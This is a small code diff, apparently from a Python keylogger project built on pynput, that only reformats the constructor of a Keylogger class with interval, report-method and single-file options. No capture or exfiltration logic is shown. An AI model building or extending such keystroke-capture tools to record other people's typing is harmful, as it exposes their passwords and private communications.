@@ -4,7 +4,8 @@ from pynput.keyboard import Listener, Key
 
 class Keylogger:
     def __init__(
-        self, interval : int = 60,
+        self,
+        interval : int = 60,
         reportMethod : str = "file",
         onlyOneFile : bool = False
     ):
